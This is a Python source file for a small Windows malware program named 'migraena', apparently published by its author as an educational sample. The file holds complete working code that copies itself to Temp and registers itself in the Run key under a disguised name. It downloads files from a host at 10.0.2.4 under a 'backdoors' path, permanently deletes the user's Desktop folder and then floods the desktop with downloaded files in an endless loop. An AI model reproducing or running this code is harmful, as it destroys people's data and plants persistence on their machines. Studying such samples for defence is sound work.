# ---------------------
# This simple malware example is prepared for EDUCATIONAL purposes.
# It IS NOT a ransomware example.
# Instead of encrypting data, it PERMANENTLY deletes it.
# Deleted files CANNOT BE RECOVERED.
# Do NOT RUN it on your own machine.
# ---------------------
# migraena.py
# created by @norcholly
# https://alirfandogan.com/2024/07/02/migraena-malware/
# https://github.com/norcholly
# ---------------------

import os
import shutil
import sys
import winreg
import urllib.request
import time
import ctypes
import tempfile

def copy_to_temp():
    # Copies the current executable to the temp folder.
    try:
        source = os.path.abspath(sys.executable)
        destination = os.path.expanduser("~\\AppData\\Local\\Temp")
        shutil.copy(source, destination)
        return os.path.join(destination, os.path.basename(source))
    except Exception as e:
        pass

def add_to_startup(file_path):
    # Adds the file to the Windows startup registry.
    try:
        startup_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "SystemDevice", 0, winreg.REG_SZ, file_path)
    except Exception as e:
        pass

def download_file(url, file_name):
    # Downloads a file from the given URL.
    try:
        urllib.request.urlretrieve(url, file_name)
    except Exception as e:
        pass

def set_wallpaper(image_path):
    # Sets the downloaded image as the wallpaper.
    try:
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
    except Exception as e:
        pass

def delete_desktop():
    # Permanently deletes the user's Desktop folder.
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop_path) and os.path.isdir(desktop_path):
            shutil.rmtree(desktop_path)
    except Exception as e:
        pass

if __name__ == "__main__":
    copied_path = copy_to_temp()
    add_to_startup(copied_path)
    wallpaper_path = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
    download_file("http://10.0.2.4/backdoors/wallpaper.jpg", wallpaper_path)
    set_wallpaper(wallpaper_path)
    delete_desktop()

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_counter = 1    
    while True:
        migraena_url = "http://10.0.2.4/backdoors/migraena.txt"
        migraena_filename = f"migraena ({file_counter}).txt"
        migraena_path = os.path.join(desktop_path, migraena_filename)
        download_file(migraena_url, migraena_path)
        file_counter += 1
        time.sleep(1)